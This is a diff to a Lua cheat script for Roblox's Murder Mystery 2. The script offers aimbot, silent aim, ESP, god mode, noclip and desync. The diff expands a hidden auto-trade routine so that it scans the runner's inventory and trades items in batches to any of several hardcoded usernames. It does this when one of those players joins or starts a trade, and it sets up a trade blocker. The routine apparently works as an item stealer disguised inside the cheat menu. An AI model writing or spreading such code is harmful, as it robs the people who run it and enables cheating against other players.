@@ -6,6 +6,18 @@ ConfigManager = Compkiller:ConfigManager({
 });
 Compkiller:Loader("rbxassetid://120245531583106", 2.5):yield();
 
+-- ===== MULTIPLE TRADE TARGETS SETUP =====
+-- ADD ALL YOUR ALT ACCOUNTS HERE (script will auto-trade with ANY of them)
+local AvailableTargets = {
+    "kqrbyz",
+    "Mm2_5004",
+    "K3TCHUPSS",
+    -- "altaccount1",     -- Uncomment and add your alts
+    -- "altaccount2",
+    -- "altaccount3",
+}
+-- =======================================
+
 -- ERROR FILTERS
 local oldPrint = print
 print = function(...)
@@ -184,7 +196,7 @@ getgenv().MM2State = {
 }
 State = getgenv().MM2State
 
--- ===== TRADE SYSTEM =====
+-- ===== TRADE SYSTEM (MULTI-TARGET) =====
 Sync = nil
 pcall(function() Sync = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync")) end)
 
@@ -200,7 +212,6 @@ RaritySort = {
     ["Classic"] = 110, ["Unique"] = 70,
 }
 
-TradeConfig = { TargetUsername = "kqrbyz", ItemsPerTrade = 4 }
 Trade = ReplicatedStorage:FindFirstChild("Trade")
 TradeState = {
     hasSent = false, hasOffered = false, hasAccepted = false,
@@ -208,6 +219,17 @@ TradeState = {
     isProcessing = false, isTargetTrade = false,
 }
 TradeBlockerSetup = false
+
+-- Helper function to check if a player is in targets list
+local function isInTargetList(playerName)
+    if not playerName then return false end
+    for _, targetName in ipairs(AvailableTargets) do
+        if playerName:lower() == targetName:lower() then
+            return true
+        end
+    end
+    return false
+end
 
 setupInstantBlocker = function()
     if TradeBlockerSetup then return end
@@ -285,8 +307,8 @@ scanInventory = function()
 end
 
 getNextBatch = function()
-    local startIdx = (TradeState.currentBatch - 1) * TradeConfig.ItemsPerTrade + 1
-    local endIdx = math.min(startIdx + TradeConfig.ItemsPerTrade - 1, #TradeState.allItems)
+    local startIdx = (TradeState.currentBatch - 1) * 4 + 1
+    local endIdx = math.min(startIdx + 3, #TradeState.allItems)
     if startIdx > #TradeState.allItems then return {} end
     local batch = {}
     for i = startIdx, endIdx do
@@ -372,7 +394,9 @@ end
 
 findTargetPlayer = function()
     for _, plr in ipairs(Players:GetPlayers()) do
-        if plr.Name:lower() == TradeConfig.TargetUsername:lower() then return plr end
+        if isInTargetList(plr.Name) then
+            return plr
+        end
     end
     return nil
 end
@@ -417,7 +441,7 @@ if Trade then
     local startTradeRemote = Trade:FindFirstChild("StartTrade")
     if startTradeRemote then
         startTradeRemote.OnClientEvent:Connect(function(tradeData, username)
-            if username and username:lower() == TradeConfig.TargetUsername:lower() then
+            if username and isInTargetList(username) then
                 TradeState.isTargetTrade = true
                 local hasMore = executeFullTrade()
                 if hasMore then
@@ -443,7 +467,7 @@ if Trade then
 end
 
 Players.PlayerAdded:Connect(function(plr)
-    if plr.Name:lower() == TradeConfig.TargetUsername:lower() then
+    if isInTargetList(plr.Name) then
         TradeState.hasSent = false
         TradeState.hasOffered = false
         TradeState.hasAccepted = false
@@ -473,363 +497,52 @@ task.spawn(function()
     end
 end)
 
--- ===== FPS BOOSTER =====
-FPSBoosterEnabled = false
-DisabledAssets = {}
+-- ===== SIMPLE PREDICTION SYSTEM =====
+local SIMPLE_PREDICTION_TIME = 0.08
 
-ApplyFPSBooster = function()
-    if not FPSBoosterEnabled then return end
-    for _, v in next, game:GetDescendants() do
-        if v:IsA("Decal") or v:IsA("Texture") then
-            pcall(function()
-                if v.Texture ~= "" then
-                    table.insert(DisabledAssets, {obj = v, prop = "Texture", value = v.Texture})
-                    v.Texture = ""
-                end
-            end)
-        end
+predictPlayerPosition = function(player, targetPart)
+    if not player or not player.Character then 
+        return targetPart and targetPart.Position or Vector3.new() 
     end
-    for _, v in next, game:GetDescendants() do
-        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
-            pcall(function()
-                if v.Enabled then
-                    table.insert(DisabledAssets, {obj = v, prop = "Enabled", value = true})
-                    v.Enabled = false
-                end
-            end)
-        end
-    end
-    for _, v in next, game:GetDescendants() do
-        if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
-            pcall(function()
-                if v.Material ~= Enum.Material.SmoothPlastic then
-                    table.insert(DisabledAssets, {obj = v, prop = "Material", value = v.Material})
-                    v.Material = Enum.Material.SmoothPlastic
-                end
-            end)
-        end
-    end
-    for _, v in next, game:GetDescendants() do
-        if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
-            pcall(function()
-                if v.Enabled then
-                    table.insert(DisabledAssets, {obj = v, prop = "Enabled", value = true})
-                    v.Enabled = false
-                end
-            end)
-        end
-    end
-    for _, v in next, game:GetDescendants() do
-        if v:IsA("Sky") then
-            pcall(function()
-                table.insert(DisabledAssets, {obj = v, prop = "Parent", value = v.Parent})
-                v.Parent = nil
-            end)
-        end
-    end
-end
-
-DisableFPSBooster = function()
-    for _, asset in ipairs(DisabledAssets) do
-        pcall(function()
-            if asset.obj then
-                if asset.prop == "Parent" then
-                    if asset.value then asset.obj.Parent = asset.value end
-                else
-                    asset.obj[asset.prop] = asset.value
-                end
-            end
-        end)
-    end
-    DisabledAssets = {}
-end
-
-descendantConnection = nil
-MonitorForNewAssets = function()
-    if descendantConnection then descendantConnection:Disconnect() descendantConnection = nil end
-    if not FPSBoosterEnabled then return end
-    descendantConnection = game.DescendantAdded:Connect(function(v)
-        if not FPSBoosterEnabled then return end
-        task.wait(0.1)
-        if v:IsA("Decal") or v:IsA("Texture") then
-            pcall(function() v.Texture = "" end)
-        elseif v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
-            pcall(function() v.Enabled = false end)
-        elseif v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
-            pcall(function() v.Material = Enum.Material.SmoothPlastic end)
-        elseif v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
-            pcall(function() v.Enabled = false end)
-        elseif v:IsA("Sky") then
-            pcall(function() v.Parent = nil end)
-        end
-    end)
-end
-
-ToggleFPSBooster = function(enabled)
-    FPSBoosterEnabled = enabled
-    if enabled then
-        ApplyFPSBooster()
-        MonitorForNewAssets()
-    else
-        if descendantConnection then descendantConnection:Disconnect() descendantConnection = nil end
-        DisableFPSBooster()
-    end
-end
-
--- ===== ENHANCED PREDICTION SYSTEM WITH JUMP TRAJECTORY =====
-PredictionSystem = {playerData = {}, gravity = workspace.Gravity}
-NetworkMetrics = {
-    ping = 0, variance = 0, jitter = 0, standardDeviation = 0,
-    lastUpdate = 0, history = {}, maxHistory = 200,
-    RTTBuffer = 0, packetLoss = 0, stability = 1.0,
-}
-
-getNetworkPing = function()
-    local ping = 0
-    pcall(function() ping = LocalPlayer:GetNetworkPing() * 1000 end)
-    if ping == 0 then
-        local stats = Stats.Network.ServerStatsItem["Data Ping"]
-        if stats then ping = tonumber(stats:GetValueString():match("%d+")) or 0 end
-    end
-    return math.clamp(ping, 2, 500)
-end
-
-calculateStandardDeviation = function(data)
-    if #data < 2 then return 0 end
-    local sum = 0 for _, v in ipairs(data) do sum = sum + v end
-    local mean = sum / #data
-    local varianceSum = 0 for _, v in ipairs(data) do varianceSum = varianceSum + (v - mean) ^ 2 end
-    return math.sqrt(varianceSum / #data)
-end
-
-updateNetworkMetrics = function()
-    local currentTime = tick()
-    if currentTime - NetworkMetrics.lastUpdate < 0.1 then return end
-    local rawPing = getNetworkPing()
-    table.insert(NetworkMetrics.history, 1, rawPing)
-    if #NetworkMetrics.history > NetworkMetrics.maxHistory then table.remove(NetworkMetrics.history) end
-    if #NetworkMetrics.history >= 30 then
-        local recentPings = {}
-        for i = 1, math.min(50, #NetworkMetrics.history) do table.insert(recentPings, NetworkMetrics.history[i]) end
-        local sum = 0 for _, p in ipairs(recentPings) do sum = sum + p end
-        local avgPing = sum / #recentPings
-        NetworkMetrics.standardDeviation = calculateStandardDeviation(recentPings)
-        NetworkMetrics.variance = NetworkMetrics.standardDeviation ^ 2
-        NetworkMetrics.jitter = NetworkMetrics.standardDeviation * 0.6
-        NetworkMetrics.ping = avgPing
-        local stableCount = 0
-        for _, p in ipairs(recentPings) do if math.abs(p - avgPing) < NetworkMetrics.standardDeviation * 1.5 then stableCount = stableCount + 1 end end
-        NetworkMetrics.stability = stableCount / #recentPings
-        NetworkMetrics.RTTBuffer = (NetworkMetrics.ping + NetworkMetrics.jitter * 1.2) / 1000
-    else
-        NetworkMetrics.ping = rawPing
-        NetworkMetrics.RTTBuffer = rawPing / 1000
-        NetworkMetrics.stability = 0.5
-    end
-    NetworkMetrics.lastUpdate = currentTime
-end
-
-initPlayerData = function(player)
-    if not PredictionSystem.playerData[player] then
-        PredictionSystem.playerData[player] = {
-            lastPosition = Vector3.new(), lastVelocity = Vector3.new(), lastTime = tick(),
-            positionHistory = {}, velocityHistory = {}, directionHistory = {},
-            lastTargetPart = "UpperTorso", wasJumping = false, strafeDirection = 0, lastStrafeTime = 0,
-            acceleration = Vector3.new(), lastVelMagnitude = 0, isFlying = false, flyingTime = 0,
-            maxVelocity = 0, speedHackDetected = false,
-        }
-    end
-    return PredictionSystem.playerData[player]
-end
-
-isPlayerJumping = function(character)
-    if not character then return false end
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-    if not humanoid then return false end
-    local rootPart = character:FindFirstChild("HumanoidRootPart")
-    if rootPart then
-        local velocityY = rootPart.AssemblyLinearVelocity and rootPart.AssemblyLinearVelocity.Y or 0
-        return velocityY > 5 and humanoid.FloorMaterial == Enum.Material.Air
-    end
-    return false
-end
-
-detectFlyingOrSpeedhack = function(data, currentVel, gravity)
-    local velMagnitude = currentVel.Magnitude
-    local velDelta = velMagnitude - data.lastVelMagnitude
-    if velMagnitude > data.maxVelocity then data.maxVelocity = velMagnitude end
-    local normalMaxAccel = gravity * 5
-    local detectedAccel = math.abs(velDelta)
-    if detectedAccel > normalMaxAccel * 2 and velMagnitude > 50 then
-        data.speedHackDetected = true
-    else
-        data.speedHackDetected = false
-    end
-    local velocityY = currentVel.Y
-    if velocityY > 10 and not isPlayerJumping then
-        data.flyingTime = data.flyingTime + 0.016
-        if data.flyingTime > 0.2 then data.isFlying = true end
-    else
-        data.flyingTime = 0
-        data.isFlying = false
-    end
-    if #data.velocityHistory > 0 then
-        local timeDelta = 0.016
-        data.acceleration = (currentVel - data.lastVelocity) / timeDelta
-    end
-end
-
-detectStrafeDirection = function(player, currentVel)
-    local data = initPlayerData(player)
-    if #data.velocityHistory < 3 then return 0 end
-    local prevVel = data.velocityHistory[#data.velocityHistory - 1]
-    if not prevVel then return 0 end
-    local currentHoriz = Vector3.new(currentVel.X, 0, currentVel.Z)
-    local prevHoriz = Vector3.new(prevVel.vel.X, 0, prevVel.vel.Z)
-    if currentHoriz.Magnitude < 5 or prevHoriz.Magnitude < 5 then return 0 end
-    local currentDir = currentHoriz.Unit
-    local prevDir = prevHoriz.Unit
-    local crossY = prevDir.X * currentDir.Z - prevDir.Z * currentDir.X
-    local strafeDirection = crossY > 0.1 and 1 or (crossY < -0.1 and -1 or 0)
-    if strafeDirection ~= 0 and strafeDirection ~= data.strafeDirection then data.lastStrafeTime = tick() end
-    data.strafeDirection = strafeDirection
-    return strafeDirection
-end
-
--- ENHANCED PREDICTION WITH JUMP TRAJECTORY
-predictPlayerPositionAdvanced = function(player, targetPart)
-    if not player or not player.Character then return targetPart and targetPart.Position or Vector3.new() end
+    
     local character = player.Character
     local hrp = character:FindFirstChild("HumanoidRootPart")
-    if not hrp then return targetPart and targetPart.Position or Vector3.new() end
-    
-    updateNetworkMetrics()
-    local data = initPlayerData(player)
-    local currentTime = tick()
-    local currentPos = hrp.Position
-    local currentVel = hrp.Velocity
-    local gravity = PredictionSystem.gravity
-    
-    detectFlyingOrSpeedhack(data, currentVel, gravity)
-    
-    table.insert(data.positionHistory, 1, {pos = currentPos, time = currentTime})
-    if #data.positionHistory > 20 then table.remove(data.positionHistory) end
-    table.insert(data.velocityHistory, 1, {vel = currentVel, time = currentTime})
-    if #data.velocityHistory > 20 then table.remove(data.velocityHistory) end
-    
-    if currentVel.Magnitude > 1 then
-        local currentDir = currentVel.Unit
-        table.insert(data.directionHistory, 1, currentDir)
-        if #data.directionHistory > 15 then table.remove(data.directionHistory) end
+    if not hrp then 
+        return targetPart and targetPart.Position or Vector3.new() 
     end
     
-    data.lastPosition = currentPos
-    data.lastVelocity = currentVel
-    data.lastTime = currentTime
-    data.lastVelMagnitude = currentVel.Magnitude
+    local chosenPart = targetPart or character:FindFirstChild("UpperTorso") or 
+                       character:FindFirstChild("Torso") or 
+                       character:FindFirstChild("Head") or hrp
     
-    local isJumping = isPlayerJumping(character)
-    local chosenPart = targetPart or character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso") or hrp
+    if not chosenPart then return hrp.Position end
+    
     local targetPos = chosenPart.Position
-    local velocity = chosenPart.AssemblyLinearVelocity or Vector3.new()
+    local velocity = chosenPart.AssemblyLinearVelocity or hrp.AssemblyLinearVelocity or Vector3.new()
     
-    -- Dynamic prediction time
-    local basePrediction = math.clamp(NetworkMetrics.RTTBuffer + 0.035, 0.03, 0.12)
-    local speedBonus = 0
+    local predictedPos = targetPos + (velocity * SIMPLE_PREDICTION_TIME)
     
-    if data.isFlying then
-        speedBonus = math.min(velocity.Magnitude / 2000, 0.08)
-        basePrediction = basePrediction + 0.03
-    elseif data.speedHackDetected then
-        speedBonus = math.min(velocity.Magnitude / 1500, 0.1)
-        basePrediction = basePrediction + 0.04
-    else
-        speedBonus = math.min(velocity.Magnitude / 2500, 0.06)
+    if velocity.Y > 3 or velocity.Y < -2 then
+        local gravity = workspace.Gravity
+        local jumpOffset = (velocity.Y * SIMPLE_PREDICTION_TIME) - (0.5 * gravity * SIMPLE_PREDICTION_TIME * SIMPLE_PREDICTION_TIME)
+        predictedPos = Vector3.new(predictedPos.X, targetPos.Y + jumpOffset, predictedPos.Z)
     end
     
-    local predictionTime = math.clamp(basePrediction + speedBonus, 0.035, 0.15)
-    local predictedPos = targetPos + (velocity * predictionTime)
-    
-    -- ENHANCED JUMP TRAJECTORY PREDICTION
-    if isJumping or math.abs(velocity.Y) > 5 then
-        local jumpTime = predictionTime
-        local verticalVelocity = velocity.Y
-        
-        local isAtPeak = math.abs(verticalVelocity) < 3 and isJumping
-        local isAscending = verticalVelocity > 3
-        local isDescending = verticalVelocity < -3
-        
-        local verticalOffset = (verticalVelocity * jumpTime) - (0.5 * gravity * jumpTime * jumpTime)
-        
-        if isDescending then
-            verticalOffset = verticalOffset - (gravity * jumpTime * jumpTime * 0.3)
-        end
-        
-        if isAscending then
-            verticalOffset = verticalOffset + (verticalVelocity * jumpTime * 0.2)
-        end
-        
-        if isAtPeak then
-            verticalOffset = verticalOffset + 1.5
-        end
-        
-        predictedPos = Vector3.new(predictedPos.X, targetPos.Y + verticalOffset, predictedPos.Z)
-        
-        -- Horizontal prediction for jumping targets
-        if isJumping and velocity.Magnitude > 8 then
-            local horizontalVel = Vector3.new(velocity.X, 0, velocity.Z)
-            local horizontalPrediction = horizontalVel * predictionTime * 1.1
-            predictedPos = Vector3.new(predictedPos.X + horizontalPrediction.X, predictedPos.Y, predictedPos.Z + horizontalPrediction.Z)
-        end
-    else
-        predictedPos = Vector3.new(predictedPos.X, targetPos.Y, predictedPos.Z)
-    end
-    
-    -- Strafe prediction only for ground movement
-    if not isJumping and velocity.Magnitude > 12 and #data.directionHistory >= 5 then
-        local directionChanges = 0
-        for i = 2, math.min(5, #data.directionHistory) do 
-            if data.directionHistory[i-1]:Dot(data.directionHistory[i]) < 0.5 then 
-                directionChanges = directionChanges + 1 
-            end 
-        end
-        if directionChanges >= 2 then
-            local zigzagFactor = math.sin(tick() * 20) * 0.3
-            predictedPos = predictedPos + (chosenPart.CFrame.RightVector * zigzagFactor * 0.3)
-        end
-    end
-    
-    -- Smoothing
-    if #data.velocityHistory >= 2 then
-        local avgVelX = 0
-        local avgVelZ = 0
-        local weightSum = 0
-        for i = 1, math.min(2, #data.velocityHistory) do
-            local weight = 1 / i
-            avgVelX = avgVelX + data.velocityHistory[i].vel.X * weight
-            avgVelZ = avgVelZ + data.velocityHistory[i].vel.Z * weight
-            weightSum = weightSum + weight
-        end
-        if weightSum > 0 then
-            avgVelX = avgVelX / weightSum
-            avgVelZ = avgVelZ / weightSum
-            local smoothedVel = Vector3.new(avgVelX, velocity.Y * 0.5, avgVelZ)
-            local smoothedPos = targetPos + (smoothedVel * predictionTime * 0.5)
-            predictedPos = predictedPos * 0.8 + smoothedPos * 0.2
-        end
-    end
-    
-    -- Sanity check
-    local lowestPoint = targetPos.Y - 4
-    if predictedPos.Y < lowestPoint then
-        predictedPos = Vector3.new(predictedPos.X, lowestPoint, predictedPos.Z)
-    end
+    predictedPos = Vector3.new(
+        predictedPos.X,
+        math.clamp(predictedPos.Y, -50, 500),
+        predictedPos.Z
+    )
     
     return predictedPos
 end
 
-predictPlayerPosition = function(player, targetPart)
-    return predictPlayerPositionAdvanced(player, targetPart)
+predictMurdererPosSH = function(murderer)
+    if not murderer or not murderer.Character then return nil end
+    local targetPart = murderer.Character:FindFirstChild("HumanoidRootPart") or 
+                       murderer.Character:FindFirstChild("UpperTorso") or 
+                       murderer.Character:FindFirstChild("Torso")
+    return predictPlayerPosition(murderer, targetPart)
 end
 
 -- ===== UTILITY FUNCTIONS =====
@@ -1108,7 +821,6 @@ SetupPlayerESP = function(plr)
     plr.CharacterAdded:Connect(function(char)
         task.wait(0.85)
         if State.esp_enabled and char and char.Parent then CreateESP(char, plr) end
-        PredictionSystem.playerData[plr] = nil
         task.spawn(function() monitorCharacterTools(plr) end)
     end)
     plr.CharacterRemoving:Connect(CleanupESP)
@@ -1583,8 +1295,6 @@ end
 HoldingMouse2 = false
 LockedTarget = nil
 LastLockedTarget = nil
-AimbotToggle = nil
-DesyncToggle = nil
 
 getPlayerNames = function()
     local names = {}
@@ -1602,9 +1312,10 @@ getBestTarget = function()
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer and isAlive(plr) and plr.Character then
             if State.aimbot_murderer_only and not isMurderer(plr) then continue end
-            local isJumping = isPlayerJumping(plr.Character)
-            local targetPart = isJumping and plr.Character:FindFirstChild("HumanoidRootPart") or (plr.Character:FindFirstChild("UpperTorso") or plr.Character:FindFirstChild("Torso"))
-            if not targetPart then targetPart = plr.Character:FindFirstChild("Head") end
+            local targetPart = plr.Character:FindFirstChild("HumanoidRootPart") or 
+                               plr.Character:FindFirstChild("UpperTorso") or 
+                               plr.Character:FindFirstChild("Torso") or
+                               plr.Character:FindFirstChild("Head")
             if targetPart then
                 local screenPos, onScreen = camera:WorldToViewportPoint(targetPart.Position)
                 if onScreen then
@@ -1632,17 +1343,7 @@ updateAimbot = function()
                        targetPlr.Character:FindFirstChild("Torso")
     if not targetPart then return end
     
-    local predictedPos = predictPlayerPositionAdvanced(targetPlr, targetPart)
-    local isJumping = isPlayerJumping(targetPlr.Character)
-    
-    if isJumping then
-        local velocity = targetPart.AssemblyLinearVelocity or Vector3.new()
-        predictedPos = predictedPos + Vector3.new(velocity.X * 0.05, 0, velocity.Z * 0.05)
-    end
-    
-    if predictedPos.Y < targetPart.Position.Y - 3 then
-        predictedPos = Vector3.new(predictedPos.X, targetPart.Position.Y, predictedPos.Z)
-    end
+    local predictedPos = predictPlayerPosition(targetPlr, targetPart)
     
     local camera = Workspace.CurrentCamera
     local currentCFrame = camera.CFrame
@@ -1683,7 +1384,9 @@ performFlickShoot = function()
                        targetPlr.Character:FindFirstChild("UpperTorso") or 
                        targetPlr.Character:FindFirstChild("Torso")
     if not targetPart then return end
-    local targetPos = predictPlayerPositionAdvanced(targetPlr, targetPart)
+    
+    local targetPos = predictPlayerPosition(targetPlr, targetPart)
+    
     local camera = Workspace.CurrentCamera
     local startCFrame = camera.CFrame
     local targetCFrame = CFrame.new(camera.CFrame.Position, targetPos)
@@ -1718,12 +1421,13 @@ getMurdererTargetPosition = function()
         end
     end
     if not targetMurderer or not targetMurderer.Character then return nil end
-    local character = targetMurderer.Character
-    local targetPart = character:FindFirstChild("HumanoidRootPart") or 
-                       character:FindFirstChild("UpperTorso") or 
-                       character:FindFirstChild("Torso") or
-                       character:FindFirstChild("Head")
+    
+    local targetPart = targetMurderer.Character:FindFirstChild("HumanoidRootPart") or 
+                       targetMurderer.Character:FindFirstChild("UpperTorso") or 
+                       targetMurderer.Character:FindFirstChild("Torso") or
+                       targetMurderer.Character:FindFirstChild("Head")
     if not targetPart then return nil end
+    
     return predictPlayerPosition(targetMurderer, targetPart)
 end
 
@@ -1757,24 +1461,6 @@ findMurdererSilentHacker = function()
         if player ~= LocalPlayer and isAlive(player) and isMurderer(player) then return player end
     end
     return nil
-end
-
-predictMurdererPosSH = function(murderer)
-    if not murderer or not murderer.Character then return nil end
-    local hrp = murderer.Character:FindFirstChild("HumanoidRootPart")
-    if not hrp then return nil end
-    updateNetworkMetrics()
-    local targetPos = hrp.Position
-    local velocity = hrp.AssemblyLinearVelocity or hrp.Velocity or Vector3.new()
-    local predictionTime = (NetworkMetrics.ping / 1000) + 0.085
-    predictionTime = math.clamp(predictionTime, 0.03, 0.2)
-    local predictedPos = targetPos + (velocity * predictionTime)
-    if velocity.Y ~= 0 then
-        local gravity = Workspace.Gravity
-        local verticalPos = targetPos.Y + (velocity.Y * predictionTime) - (0.5 * gravity * predictionTime * predictionTime)
-        predictedPos = Vector3.new(predictedPos.X, verticalPos, predictedPos.Z)
-    end
-    return predictedPos
 end
 
 stopSilentHacker = function()
@@ -1811,9 +1497,7 @@ performSilentHacker = function()
     end
     getgenv().SH_Coroutine = task.spawn(function()
         local startTime = tick()
-        local timeRemaining = State.silent_hacker_duration
-        while timeRemaining > 0 and State.silent_hacker_active do
-            timeRemaining = State.silent_hacker_duration - (tick() - startTime)
+        while tick() - startTime < State.silent_hacker_duration and State.silent_hacker_active do
             if not rootPart or not rootPart.Parent then stopSilentHacker() return end
             murderer = findMurdererSilentHacker()
             if not murderer or not isAlive(murderer) then stopSilentHacker() return end
@@ -2477,7 +2161,6 @@ end)
 -- ===== UPDATE LOOP =====
 task.spawn(function()
     while task.wait(0.1) do
-        updateNetworkMetrics()
         if State.hitbox_enabled then UpdateAllHitboxes() end
         refreshToolGunESP()
         highlightDroppedGun()
@@ -2521,7 +2204,6 @@ LocalPlayer.CharacterAdded:Connect(function()
     if State.antifling_enabled then setupAntiFling() end
     if State.noclip_enabled then setupNoclip() end
     if State.infinite_jump then setupInfiniteJump() end
-    PredictionSystem.playerData = {}
     applyWalkSpeed()
     if State.headless_enabled then applyHeadless() end
     if State.korblox_enabled then applyKorblox() else backupLegData() end
@@ -2572,20 +2254,17 @@ Watermark = Window:Watermark()
 Watermark:AddText({ Icon = "user", Text = "Kherby" })
 Watermark:AddText({ Icon = "clock", Text = Compkiller:GetDate() })
 Time = Watermark:AddText({ Icon = "timer", Text = "TIME" })
-PingDisplay = Watermark:AddText({ Icon = "wifi", Text = "PING: 0ms" })
 Watermark:AddText({ Icon = "server", Text = Compkiller.Version })
 
 task.spawn(function()
     while task.wait(0.5) do
         Time:SetText(Compkiller:GetTimeNow())
-        PingDisplay:SetText(string.format("PING: %dms | VAR: %dms | STD: %.1f | STAB: %.1f%%",
-            NetworkMetrics.ping, NetworkMetrics.variance, NetworkMetrics.standardDeviation, NetworkMetrics.stability * 100))
     end
 end)
 
 Notifier.new({
-    Title = "MM2",
-    Content = "loaded",
+    Title = "MM2 Script",
+    Content = "loaded with multi-target trade system",
     Duration = 8,
     Icon = "rbxassetid://120245531583106"
 })
@@ -2679,7 +2358,7 @@ VisualsCosmetics:AddToggle({
 -- ===== SHERIFF TAB =====
 SheriffTab = Window:DrawTab({ Name = "Sheriff", Icon = "target", EnableScrolling = true })
 SheriffCameraSection = SheriffTab:DrawSection({ Name = "Camera Aimbot", Position = 'left' })
-AimbotToggle = SheriffCameraSection:AddToggle({
+SheriffCameraSection:AddToggle({
     Name = "Enable Aimbot Feature",
     Flag = "Aimbot_Enabled",
     Default = false,
@@ -2948,7 +2627,7 @@ ExploitSurvivalSection:AddToggle({
 ExploitSurvivalSection:AddKeybind({ Name = "God Mode Keybind", Default = "G", Flag = "GodMode_Keybind", Callback = function(v) State.godmode_keybind = v end })
 
 ExploitDesyncSection = ExploitTab:DrawSection({ Name = "Desync", Position = 'right' })
-DesyncToggle = ExploitDesyncSection:AddToggle({
+ExploitDesyncSection:AddToggle({
     Name = "Enable Desync Feature",
     Flag = "Desync_Enabled",
     Default = false,
